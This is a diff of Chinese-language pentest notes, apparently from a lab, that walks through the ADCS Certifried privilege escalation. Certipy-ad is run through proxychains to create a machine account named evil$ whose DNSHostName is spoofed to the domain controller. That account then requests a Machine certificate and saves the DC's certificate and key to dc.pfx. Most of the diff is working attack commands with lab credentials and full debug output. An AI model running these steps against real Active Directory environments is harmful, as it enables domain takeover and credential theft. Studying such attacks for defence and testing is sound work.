@@ -750,20 +750,37 @@ MAQ         172.24.7.3      389    DC               MachineAccountQuota: 10
 
 使用 `certipy-ad` 创建一个机器账户，并将该机器账户 `DNSHostName` 属性指向域控：
 ```bash
-☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q certipy-ad account create -u usera@pentest.me -p 'Admin3gv83' -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me'
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
+☁  endless  proxychains4 -f /etc/proxychains4-24.conf certipy-ad account create -u usera -p Admin3gv83 -dc-ip 172.24.7.3 -user evil -pass Qwer1234 -dns DC.pentest.me -debug
+[proxychains] config file found: /etc/proxychains4-24.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '172.24.7.3'
+[+] DC IP: '172.24.7.3'
+[+] DC Host: ''
+[+] Target IP: '172.24.7.3'
+[+] Remote Name: '172.24.7.3'
+[+] Domain: ''
+[+] Username: 'USERA'
+[+] Authenticating to LDAP server using NTLM authentication
+[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:636  ...  OK
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://172.24.7.3:636 - ssl
+[+] Default path: DC=pentest,DC=me
+[+] Configuration path: CN=Configuration,DC=pentest,DC=me
 [*] Creating new account:
-    sAMAccountName                      : EVILCOMPUTER1$
-    unicodePwd                          : 123@#ABC
+    sAMAccountName                      : evil$
+    unicodePwd                          : Qwer1234
     userAccountControl                  : 4096
-    servicePrincipalName                : HOST/EVILCOMPUTER1
-                                          RestrictedKrbHost/EVILCOMPUTER1
+    servicePrincipalName                : HOST/evil
+                                          RestrictedKrbHost/evil
     dnsHostName                         : DC.pentest.me
-[*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
-
-#或者这个用法
-☁  endless  proxychains4 -f /etc/proxychains4-24.conf   -q certipy-ad account create -u usera@pentest.me -p Admin3gv83 -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me' 
+[*] Successfully created account 'evil$' with password 'Qwer1234'
 ```
 
 使用该机器账户向 ADCS 服务器请求域控的证书：
@@ -816,6 +833,51 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 |`-f`|强制 proxychains 使用 fork 模式|提高对 Python 应用的兼容性，避免某些网络调用绕过代理|
 - **Certipy 在 4.0 版本后正式改名为 `certipy-ad`**，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
 - **`-no-dns` 参数在 Certipy 5.0.4 版本中被移除了**，但我们仍然可以通过其他参数实现完全相同的效果。
+
+配置hosts，请求证书
+```bash
+☁  endless  proxychains4 -f /etc/proxychains4-24.conf certipy-ad req -u 'evil$@pentest.me' -p Qwer1234 -ca 'pentest-DC-CA' -dc-ip 172.24.7.3  -template Machine -debug
+[proxychains] config file found: /etc/proxychains4-24.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '172.24.7.3'
+[+] DC IP: '172.24.7.3'
+[+] DC Host: 'PENTEST.ME'
+[+] Target IP: None
+[+] Remote Name: 'PENTEST.ME'
+[+] Domain: 'PENTEST.ME'
+[+] Username: 'EVIL$'
+[+] Trying to resolve 'PENTEST.ME' at '172.24.7.3'
+[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/certipy/lib/target.py", line 442, in resolve
+    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1328, in resolve
+    timeout = self._compute_timeout(start, lifetime, resolution.errors)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1084, in _compute_timeout
+    raise LifetimeTimeout(timeout=duration, errors=errors)
+dns.resolver.LifetimeTimeout: The resolution lifetime expired after 5.404 seconds: Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
+[proxychains] Strict chain  ...  101.132.149.233:6001  ...  PENTEST.ME:445  ...  OK
+[+] Connected to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with DNS Host Name 'DC.pentest.me'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'dc.pfx'
+[+] Attempting to write data to 'dc.pfx'
+File 'dc.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[+] Data written to 'dc.pfx'
+[*] Wrote certificate and private key to 'dc.pfx'
+```
+
+
 
 用申请到的域控的证书，向 KDC 请求域控的 TGT 并获取哈希：
 ```
